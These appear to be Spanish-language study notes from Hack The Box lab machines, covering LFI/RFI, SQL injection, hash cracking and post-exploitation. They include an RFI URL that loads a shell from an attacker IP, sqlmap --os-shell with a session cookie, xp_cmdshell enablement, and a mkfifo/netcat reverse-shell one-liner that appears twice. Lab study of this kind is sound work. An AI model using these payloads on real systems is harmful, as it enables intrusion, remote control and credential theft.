
Telnet con root no tiene contraseña
Ftp con anonymous y get para descargar el archivo
Usuario admin'# para comentar la contraseña y que no sea necesaria
Acceder a mysql sin contraseña por el usuario root
### LFI (Local File Inclusion)
vulnerabilidad donde una aplicación web permite que el usuario controle qué archivo del propio servidor se carga/incluye, sin restricción adecuada.

Ejemplo:

```
http://unika.htb/index.php?page=../../../../etc/passwd
```

En vez de cargar `french.html` como estaba pensado, el `../../../../` te saca de la carpeta esperada y te deja leer un archivo de sistema (`/etc/passwd`) que nunca debería ser visible desde la web.

### RFI (Remote File Inclusion)

Definición: variante donde, en vez de apuntar a un archivo local del servidor, apuntas a una URL externa que tú controlas, y el servidor la descarga y ejecuta.

Ejemplo:

```
http://unika.htb/index.php?page=http://TU_IP/shell.php
```

Si la configuración de PHP lo permite, el servidor víctima descarga tu `shell.php` desde tu propio servidor y lo ejecuta como si fuera código suyo, dándote ejecución remota de comandos directamente.
Acordarse de que si no es un nombre unika y no se entiende hay que meterlo dentro del /etc/hosts

### Diferencia entre queries Union y stacked

UNION = "déjame añadir columnas a lo que ya me ibas a devolver" (solo lectura de datos).
Stacked queries = "déjame mandar sentencias SQL nuevas y separadas, una detrás de otra" (puede llegar hasta ejecutar comandos del sistema).
### continuación
Uso de JohnTheRipper y usar evil-winrm como shell de windows

```
john --wordlist=RUTA_WORDLIST RUTA_ARCHIVO_HASH
evil-winrm -i IP -u USER -p PASSWD
```

Buscar subdominios
```
gobuster dns -d thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

Ver el contenido de la web
```
whatweb ip >> web
```

JohnTheRipper a carpetas zips
```
zip2john /home/angelmt/Desktop/angelmt/HTB/Maquinas/Vaccine/backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```

SQLmap – Explotar SQLi y conseguir shell del sistema (con sesión autenticada) con cookies
```
sqlmap -u "http://10.129.92.230/dashboard.php?search=1" --cookie="PHPSESSID=pg0dak4tcl9k30rcc4t7t6ek6b" --os-shell
```

Cambio de configuración para usar xp_cmdshell
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

```bash
 /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP 4444 >/tmp/f
```

Esto se ejecuta en la máquina víctima (dentro de `os-shell`). Crea un canal especial (`mkfifo`) que conecta una shell del sistema (`/bin/sh`) con una conexión de red hacia tu Parrot, el resultado es que la víctima "se conecta hacia ti" y te da control de una terminal suya. Es necesario porque `sudo -l` fallaba en `os-shell` (sin tty real).

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Convierte tu conexión básica en una terminal completa (tty real), necesaria para que `sudo` funcione correctamente pidiendo/gestionando permisos.

Mejor comando para nmap
```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP-OBJETIVO
```

Payload para un reverse shell con un nc activo

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc TU_IP 4444 >/tmp/f
```
